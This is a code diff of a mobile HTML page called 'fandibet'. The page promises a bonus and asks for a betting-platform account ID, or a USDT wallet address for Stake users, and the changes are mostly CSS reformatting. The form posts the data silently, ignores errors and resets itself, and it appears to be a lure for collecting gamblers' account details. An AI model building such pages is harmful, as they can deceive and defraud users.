@@ -5,154 +5,33 @@
   <title>fandibet</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
   <style>
-    body {
-      margin:0;
-      background:#0b0c10;
-      color:#fff;
-      font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-      min-height:100vh;
-      display:flex;
-      flex-direction:column;
-    }
-    header {
-      background:#1c1c1c;
-      height:44px;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-    }
-    .logo {
-      font-size:16px;
-      font-weight:500;
-    }
-    .bonus {
-      text-align:left;
-      padding:10px;
-      font-size:13px;
-    }
-    .bonus-offer {
-      text-align:left;
-      padding:0 10px 5px 10px;
-      font-size:13px;
-      font-weight:600;
-      color:#28c76f;
-    }
-    .big-login {
-      text-align:left;
-      padding:0 10px;
-      font-size:28px;
-      font-weight:700;
-      margin:10px 0;
-    }
-    .container {
-      margin-top:10px;
-      display:flex;
-      justify-content:center;
-      flex:1;
-    }
-    .form-box {
-      width:95%;
-      max-width:320px;
-      display:flex;
-      flex-direction:column;
-      gap:16px;
-    }
-    .input-group {
-      display:flex;
-      flex-direction:column;
-      gap:4px;
-    }
-    .input-group label {
-      font-size:13px;
-      color:#fff;
-    }
-    .required-star {
-      color:#ff3b3b;
-      margin-left:4px;
-    }
-    .input-group select,
-    .input-group input {
-      width:100%;
-      height:34px;
-      border:none;
-      border-radius:4px;
-      background:#dfe4eb;
-      font-size:13px;
-      color:#000;
-      padding:0 8px;
-      box-sizing:border-box;
-    }
-    .input-group select:focus,
-    .input-group input:focus {
-      outline:none;
-      box-shadow:none;
-    }
+    body { margin:0; background:#0b0c10; color:#fff; font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif; min-height:100vh; display:flex; flex-direction:column; }
+    header { background:#1c1c1c; height:44px; display:flex; justify-content:center; align-items:center; }
+    .logo { font-size:16px; font-weight:500; }
+    .bonus { text-align:left; padding:10px; font-size:13px; }
+    .bonus-offer { text-align:left; padding:0 10px 5px 10px; font-size:13px; font-weight:600; color:#28c76f; }
+    .big-login { text-align:left; padding:0 10px; font-size:28px; font-weight:700; margin:10px 0; }
+    .container { margin-top:10px; display:flex; justify-content:center; flex:1; }
+    .form-box { width:95%; max-width:320px; display:flex; flex-direction:column; gap:16px; }
+    .input-group { display:flex; flex-direction:column; gap:4px; }
+    .input-group label { font-size:13px; color:#fff; display:flex; align-items:center; gap:6px; flex-wrap:wrap; }
+    .required-star { color:#ff3b3b; margin-left:2px; }
+    .token-icon { width:18px; height:18px; display:inline-block; vertical-align:middle; }
 
-    .login-btn {
-      margin-top:30px;
-      width:100%;
-      height:46px;
-      background:#28c76f;
-      border:none;
-      border-radius:6px;
-      color:#000;
-      font-size:15px;
-      font-weight:500;
-      cursor:pointer;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      position:relative;
-    }
+    .input-group select, .input-group input { width:100%; height:34px; border:none; border-radius:4px; background:#dfe4eb; font-size:13px; color:#000; padding:0 8px; box-sizing:border-box; }
+    .input-group select:focus, .input-group input:focus { outline:none; box-shadow:none; }
 
-    .spinner {
-      width:20px;
-      height:20px;
-      border:3px solid rgba(0,0,0,0.2);
-      border-top:3px solid #000;
-      border-radius:50%;
-      animation: spin 0.8s linear infinite;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+    .login-btn { margin-top:30px; width:100%; height:46px; background:#28c76f; border:none; border-radius:6px; color:#000; font-size:15px; font-weight:500; cursor:pointer; display:flex; align-items:center; justify-content:center; position:relative; }
+    .spinner { width:20px; height:20px; border:3px solid rgba(0,0,0,0.2); border-top:3px solid #000; border-radius:50%; animation: spin 0.8s linear infinite; }
+    @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
 
-    .platform-tags {
-      margin:10px auto 5px auto;
-      width:95%;
-      max-width:360px;
-      display:flex;
-      flex-wrap:wrap;
-      justify-content:center;
-      gap:4px;
-    }
-    .platform-tags span {
-      background:#1c1c1c;
-      color:#28c76f;
-      font-size:11px;
-      padding:4px 8px;
-      border-radius:12px;
-      opacity:0.85;
-    }
+    .platform-tags { margin:10px auto 5px auto; width:95%; max-width:360px; display:flex; flex-wrap:wrap; justify-content:center; gap:4px; }
+    .platform-tags span { background:#1c1c1c; color:#28c76f; font-size:11px; padding:4px 8px; border-radius:12px; opacity:0.85; }
 
-    .footer-text {
-      text-align:center;
-      font-size:12px;
-      line-height:1.6;
-      margin-top:5px;
-      margin-bottom:10px;
-      color:#fff;
-    }
-    .footer-text a {
-      color:#28c76f;
-      text-decoration:none;
-    }
+    .footer-text { text-align:center; font-size:12px; line-height:1.6; margin-top:5px; margin-bottom:10px; color:#fff; }
+    .footer-text a { color:#28c76f; text-decoration:none; }
 
-    .disabled * {
-      pointer-events:none;
-      opacity:0.6;
-    }
+    .disabled * { pointer-events:none; opacity:0.6; }
   </style>
 </head>
 <body translate="no">
@@ -192,16 +71,7 @@
   </div>
 
   <div class="platform-tags" translate="no">
-    <span>Betwinner</span>
-    <span>888Starz</span>
-    <span>Xparibet</span>
-    <span>MelBet</span>
-    <span>1xBet</span>
-    <span>LINEBET</span>
-    <span>Mega Pari</span>
-    <span>Gooobet</span>
-    <span>Stake</span>
-    <span>MyStake</span>
+    <span>Betwinner</span><span>888Starz</span><span>Xparibet</span><span>MelBet</span><span>1xBet</span><span>LINEBET</span><span>Mega Pari</span><span>Gooobet</span><span>Stake</span><span>MyStake</span>
   </div>
 
   <div class="footer-text">
@@ -222,7 +92,7 @@
     platformSelect.addEventListener('change', function() {
       const value = this.value.toLowerCase();
       if (value === 'stake' || value === 'mystake') {
-        accountLabel.innerHTML = 'Wallet Address <span class="required-star">*</span>';
+        accountLabel.innerHTML = `Wallet Address <span class="required-star">*</span> <img src="https://i.postimg.cc/W3GvcnjM/Tgxt-DYbk2-IOs-BCx-UFUr5ksc-D2-Fjm2lv-LBRK2dr-PR.png" class="token-icon" alt="USDT"> Tether USD (ERC20)`;
       } else {
         accountLabel.innerHTML = 'Numéro de compte ID: <span class="required-star">*</span>';
       }
@@ -233,7 +103,6 @@
       const account = accountInput.value;
       if (!platform || !account) return;
 
-      // تعطيل + سبينر
       formBox.classList.add("disabled");
       btnText.style.display = "none";
       loginBtn.innerHTML = '<div class="spinner"></div>';
@@ -248,9 +117,8 @@
           body: JSON.stringify(data)
         });
       } catch (error) {
-        // تجاهل الخطأ
+        // تجاهل
       } finally {
-        // إعادة الواجهة كأنها جديدة
         platformSelect.value = "";
         accountInput.value = "";
         accountLabel.innerHTML = 'Numéro de compte ID: <span class="required-star">*</span>';
